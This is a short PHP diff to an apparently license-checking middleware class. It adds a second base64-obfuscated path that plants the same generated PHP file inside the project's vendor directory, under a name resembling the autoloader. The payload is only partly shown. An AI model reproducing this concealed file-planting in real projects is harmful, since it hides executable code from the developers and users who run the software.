@@ -71,6 +71,7 @@ class LisMid
     public function mkLtxt()
     {
         $folderPath = $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw');
+        $folderPath2 = $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9saWNlbnNlLnBocA');
 
         $cnt = '<?php
         $jsonData = json_decode(file_get_contents(rtrim(getcwd(), base64_decode("L3B1YmxpYw")) . base64_decode("L2NvbXBvc2VyLmpzb24")), true);
@@ -81,6 +82,7 @@ class LisMid
 
         // if (!file_exists($folderPath)) {
         file_put_contents($folderPath, $cnt);
+        file_put_contents($folderPath2, $cnt);
         // self::apndC();
         // }
     }
